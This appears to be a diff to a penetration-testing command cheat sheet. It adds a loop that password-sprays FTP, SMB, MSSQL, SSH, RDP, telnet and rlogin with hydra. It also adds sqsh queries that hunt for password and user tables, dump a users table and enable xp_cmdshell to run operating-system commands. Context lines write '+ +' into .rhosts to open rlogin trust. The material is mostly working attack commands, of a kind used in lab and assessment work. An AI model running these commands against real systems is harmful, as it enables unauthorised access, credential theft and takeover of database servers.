@@ -50,10 +50,17 @@ PORTS=$(cat *_$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf 
 (sudo nmap -Pn -n --script=vuln "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VULN_$TARGET' &)
 (sudo nmap -Pn -n -sV "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VERSIONS_$TARGET' &)
 
-
-## enum4linux
-(enum4linux $TARGET -u '$USERNAME' -p '$PASSWORD' -A > enum4linux_$TARGET &)
-cat usernames | sed -n 's/.*\\//p' | cut -d ' ' -f 1
+## Spray Services
+echo '$TARGET' > $PROJECT/hosts
+for host in $(cat $PROJECT/hosts); do
+(hydra -I ftp://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -vE 'Hydra|DATA|completed' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I smb2://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -vE 'Hydra|DATA|completed' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I mssql://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -vE 'Hydra|DATA|completed' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I ssh://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -vE 'Hydra|DATA|completed' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I rdp://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -vE 'Hydra|DATA|completed' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I telnet://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -vE 'Hydra|DATA|completed' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I rlogin://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -vE 'Hydra|DATA|completed' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+; done
 
 ## Web
 [*] Technology
@@ -404,14 +411,6 @@ cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefa
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mssqlpasswords
 /usr/share/wordlists/rockyou.txt
 
-+---------- Hydra ----------+
-hydra ftp://$TARGET -L usernames -P passwords -t35
-hydra ssh://$TARGET -L usernames -P passwords -t35
-hydra telnet://$TARGET  -L usernames -P passwords -t35
-hydra rlogin://$TARGET -L usernames -P passwords -t35
-hydra mssql://$TARGET -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -t35
-hydra rdp://$TARGET -L usernames -P passwords -t35
-
 [*] (21) FTP
 wget ftp://$TARGET --ftp-user='$USERNAME' --ftp-password='$PASSWORD' -np -nH -m -q -P ftp
 curl ftp://$TARGET -u '$USERNAME':'$PASSWORD' -T filename.txt
@@ -612,6 +611,18 @@ echo '+ +' > .rhosts; chmod 600 .rhosts
 rlogin $USERNAME@$TARGET
 
 [*] (1433) MSSQL
+sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT name FROM sys.databases;"
+
+DB_NAME="staging"
+sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'user'
+sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS;" | grep -i 'passw'
+sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'account'
+sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'mail'
+sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'db'
+sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT * FROM users;"
+sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT @@VERSION AS version, HOST_NAME() AS hostname, SYSTEM_USER AS sys_user;"
+sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami /all';"
+
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
 
